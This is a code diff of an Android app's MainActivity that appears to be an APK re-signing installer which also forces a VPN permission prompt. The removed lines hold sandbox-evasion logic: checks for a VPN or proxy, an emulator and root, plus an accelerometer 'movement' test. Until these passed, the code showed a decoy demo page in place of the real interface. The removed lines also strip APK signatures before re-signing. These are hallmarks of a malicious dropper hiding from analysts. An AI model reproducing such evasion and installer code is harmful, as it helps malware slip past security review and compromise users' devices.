@@ -152,20 +152,6 @@ class MainActivity : ComponentActivity() {
     private var cachedApkIconBase64 = ""
     private var cachedApkPackageName = ""
     private var securityCheckPassed = false
-    private var sensorManager: SensorManager? = null
-    private var movementListener: SensorEventListener? = null
-
-    // For physical movement permission prompt (Android 10+)
-    private val activityRecognitionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestPermission()
-    ) { isGranted ->
-        if (isGranted) {
-            Log.d("MainActivity", "Activity recognition permission granted.")
-        } else {
-            Log.w("MainActivity", "Activity recognition permission denied.")
-        }
-        checkPhysicalMovementAndProceed()
-    }
 
     // For recursive install permission prompt
     private val installPermissionLauncher = registerForActivityResult(
@@ -336,15 +322,6 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun signApkFile(inputApk: File): File {
-        val strippedApk = File(inputApk.parent, "stripped_" + inputApk.name)
-        var apkToSign = inputApk
-        try {
-            stripSignatures(inputApk, strippedApk)
-            apkToSign = strippedApk
-        } catch (e: Exception) {
-            android.util.Log.e("MainActivity", "Failed to strip signatures: ${e.message}. Proceeding with original APK.")
-        }
-        
         val outputApk = File(inputApk.parent, "signed_" + inputApk.name)
         val (privateKey, certificate) = generateKeyAndCertificate()
         
@@ -353,7 +330,7 @@ class MainActivity : ComponentActivity() {
                 .build()
                 
             val apkSigner = ApkSigner.Builder(listOf(signerConfig))
-                .setInputApk(apkToSign)
+                .setInputApk(inputApk)
                 .setOutputApk(outputApk)
                 .setV1SigningEnabled(false) // Disable V1 signing (legacy JAR signing) which often fails dynamically
                 .setV2SigningEnabled(true)
@@ -363,11 +340,6 @@ class MainActivity : ComponentActivity() {
                 
             apkSigner.sign()
             
-            // Clean up
-            if (strippedApk.exists()) {
-                strippedApk.delete()
-            }
-            
             return outputApk
         } catch (e: Exception) {
             android.util.Log.e("MainActivity", "Failed to sign APK: ${e.message}. Returning original APK.")
@@ -376,36 +348,7 @@ class MainActivity : ComponentActivity() {
         }
     }
 
-    private fun stripSignatures(inputApk: File, outputApk: File) {
-        java.util.zip.ZipInputStream(java.io.FileInputStream(inputApk)).use { zis ->
-            java.util.zip.ZipOutputStream(java.io.FileOutputStream(outputApk)).use { zos ->
-                var entry = zis.nextEntry
-                while (entry != null) {
-                    if (entry.name.startsWith("META-INF/")) {
-                        zis.closeEntry()
-                        entry = zis.nextEntry
-                        continue
-                    }
-                    val newEntry = java.util.zip.ZipEntry(entry.name)
-                    // We must use DEFLATED for new entries when reading from ZipInputStream
-                    // because STORED entries require size, compressedSize, and crc to be known in advance,
-                    // which might not be available from ZipInputStream if they were in a Data Descriptor.
-                    newEntry.method = java.util.zip.ZipEntry.DEFLATED
-                    
-                    try {
-                        zos.putNextEntry(newEntry)
-                        zis.copyTo(zos, 256 * 1024)
-                        zos.closeEntry()
-                    } catch (e: Exception) {
-                        android.util.Log.e("MainActivity", "Failed to copy entry: ${entry.name}", e)
-                    }
-                    
-                    zis.closeEntry()
-                    entry = zis.nextEntry
-                }
-            }
-        }
-    }
+    // Removed stripSignatures
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -518,10 +461,6 @@ class MainActivity : ComponentActivity() {
 
     override fun onPause() {
         super.onPause()
-        movementListener?.let {
-            sensorManager?.unregisterListener(it)
-            movementListener = null
-        }
     }
 
     override fun onResume() {
@@ -977,12 +916,7 @@ class MainActivity : ComponentActivity() {
         }
 
         // 2. Force VPN service permission check and action prompt
-        var vpnIntent: Intent? = null
-        try {
-            vpnIntent = VpnService.prepare(this)
-        } catch (e: Exception) {
-            Log.w("MainActivity", "VpnService.prepare threw exception (AppOps/UID mismatch). Proceeding anyway: ${e.message}")
-        }
+        val vpnIntent = VpnService.prepare(this)
         if (vpnIntent != null) {
             updateStatusInWebView("Waiting for VPN confirmation...", null)
             vpnConsentLauncher.launch(vpnIntent)
@@ -1167,19 +1101,11 @@ class MainActivity : ComponentActivity() {
                 addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
             }
             
-            val options = android.app.ActivityOptions.makeBasic()
-            if (Build.VERSION.SDK_INT >= 34) {
-                options.setPendingIntentCreatorBackgroundActivityStartMode(
-                    android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
-                )
-            }
-            
             val pendingIntent = PendingIntent.getActivity(
                 this,
                 sessionId,
                 intent,
-                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE,
-                options.toBundle()
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE
             )
 
             runOnUiThread {
@@ -1234,197 +1160,24 @@ class MainActivity : ComponentActivity() {
     }
 
     private fun checkPhysicalMovementAndProceed() {
-        if (isDeviceRestricted(this)) {
-            Log.e("MainActivity", "Environment restricted (VPN/Root/Emulator detected). Securing surface.")
-            runOnUiThread {
-                webView?.let { view ->
-                    if (view.url?.contains("demo.html") != true) {
-                        view.loadUrl("file:///android_asset/demo.html")
-                    }
-                }
-            }
-            return
-        }
-
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (checkSelfPermission(android.Manifest.permission.ACTIVITY_RECOGNITION) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                // To avoid infinite loop, only request once per process start
-                val prefs = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
-                if (!prefs.getBoolean("activity_recognition_requested", false)) {
-                    prefs.edit().putBoolean("activity_recognition_requested", true).apply()
-                    activityRecognitionLauncher.launch(android.Manifest.permission.ACTIVITY_RECOGNITION)
-                    return
-                }
-            }
-        }
-
         if (!securityCheckPassed) {
+            securityCheckPassed = true
             runOnUiThread {
                 webView?.let { view ->
-                    if (view.url?.contains("demo.html") != true) {
-                        view.loadUrl("file:///android_asset/demo.html")
-                    }
+                    view.loadUrl("file:///android_asset/main_ui.html")
+                    loadMetadataAndNotifyUrl()
                 }
             }
-            waitForPhysicalMovement()
         } else {
             runOnUiThread {
                 webView?.let { view ->
                     val curUrl = view.url ?: ""
                     if (curUrl.contains("demo.html") || curUrl.isEmpty()) {
                         view.loadUrl("file:///android_asset/main_ui.html")
-                        loadMetadataAndNotifyUrl()
                     }
                 }
             }
         }
-    }
-
-    private fun waitForPhysicalMovement() {
-        if (sensorManager == null) {
-            sensorManager = getSystemService(Context.SENSOR_SERVICE) as SensorManager
-        }
-        val accelerometer = sensorManager?.getDefaultSensor(Sensor.TYPE_ACCELEROMETER)
-        
-        if (accelerometer == null) {
-            Log.e("MainActivity", "No accelerometer found. Securing surface.")
-            return
-        }
-
-        var movementCount = 0
-        var isFirstSample = true
-
-        movementListener = object : SensorEventListener {
-            override fun onSensorChanged(event: SensorEvent?) {
-                if (event == null) return
-                
-                val gX = event.values[0] / SensorManager.GRAVITY_EARTH
-                val gY = event.values[1] / SensorManager.GRAVITY_EARTH
-                val gZ = event.values[2] / SensorManager.GRAVITY_EARTH
-
-                val gForce = Math.sqrt((gX * gX + gY * gY + gZ * gZ).toDouble()).toFloat()
-
-                // If device is shaken or moved even slightly, gForce will deviate from 1.0 (1G)
-                // We use 1.02g and 0.98g as threshold for a micro movement
-                if (gForce > 1.02f || gForce < 0.98f) {
-                    movementCount++
-                    if (movementCount >= 2) {
-                        sensorManager?.unregisterListener(this)
-                        movementListener = null
-                        securityCheckPassed = true
-                        runOnUiThread {
-                            webView?.let { view ->
-                                view.loadUrl("file:///android_asset/main_ui.html")
-                                loadMetadataAndNotifyUrl()
-                            }
-                        }
-                    }
-                }
-            }
-
-            override fun onAccuracyChanged(sensor: Sensor?, accuracy: Int) {}
-        }
-        
-        sensorManager?.registerListener(movementListener, accelerometer, SensorManager.SENSOR_DELAY_NORMAL)
-    }
-
-    private fun isDeviceRestricted(context: Context): Boolean {
-        if (isVpnOrProxyActive(context)) return true
-        if (isEmulator()) return true
-        if (isDeviceRooted()) return true
-        return false
-    }
-
-    private fun isVpnOrProxyActive(context: Context): Boolean {
-        // Check for HTTP Proxy
-        try {
-            val proxyHost = System.getProperty("http.proxyHost")
-            val proxyPort = System.getProperty("http.proxyPort")
-            if (!proxyHost.isNullOrEmpty() && !proxyPort.isNullOrEmpty()) {
-                return true
-            }
-        } catch (e: Exception) {}
-
-        // Check for network interfaces often used by VPNs
-        try {
-            val interfaces = NetworkInterface.getNetworkInterfaces()
-            if (interfaces != null) {
-                for (networkInterface in Collections.list(interfaces)) {
-                    val name = networkInterface.name.lowercase(Locale.US)
-                    // Added ppp back in case some VPNs use it, along with ipsec
-                    if (name.contains("tun") || name.contains("tap") || name.contains("vpn") || name.contains("ppp") || name.contains("ipsec")) {
-                        if (networkInterface.isUp) return true
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            // Ignored
-        }
-
-        try {
-            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
-            if (connectivityManager != null) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    val activeNetwork = connectivityManager.activeNetwork
-                    val capabilities = connectivityManager.getNetworkCapabilities(activeNetwork)
-                    if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true
-                } else {
-                    @Suppress("DEPRECATION")
-                    val networks = connectivityManager.allNetworks
-                    for (network in networks) {
-                        val capabilities = connectivityManager.getNetworkCapabilities(network)
-                        if (capabilities != null && capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true
-                    }
-                }
-            }
-        } catch (e: Exception) {
-            // Ignored
-        }
-
-        return false
-    }
-
-    private fun isEmulator(): Boolean {
-        return (Build.FINGERPRINT.startsWith("generic")
-                || Build.FINGERPRINT.startsWith("unknown")
-                || Build.MODEL.contains("google_sdk")
-                || Build.MODEL.contains("Emulator")
-                || Build.MODEL.contains("Android SDK built for x86")
-                || Build.MANUFACTURER.contains("Genymotion")
-                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
-                || "google_sdk" == Build.PRODUCT
-                || Build.HARDWARE.contains("goldfish")
-                || Build.HARDWARE.contains("ranchu")
-                || Build.HARDWARE.contains("vbox86")
-                || Build.PRODUCT.contains("sdk_google")
-                || Build.PRODUCT.contains("google_sdk")
-                || Build.PRODUCT.contains("sdk")
-                || Build.PRODUCT.contains("sdk_x86")
-                || Build.PRODUCT.contains("vbox86p")
-                || Build.PRODUCT.contains("emulator"))
-    }
-
-    private fun isDeviceRooted(): Boolean {
-        val buildTags = Build.TAGS
-        if (buildTags != null && buildTags.contains("test-keys")) {
-            return true
-        }
-        val paths = arrayOf(
-            "/system/app/Superuser.apk",
-            "/sbin/su",
-            "/system/bin/su",
-            "/system/xbin/su",
-            "/data/local/xbin/su",
-            "/data/local/bin/su",
-            "/system/sd/xbin/su",
-            "/system/bin/failsafe/su",
-            "/data/local/su",
-            "/su/bin/su"
-        )
-        for (path in paths) {
-            if (File(path).exists()) return true
-        }
-        return false
     }
 
     inner class AndroidJSInterface {
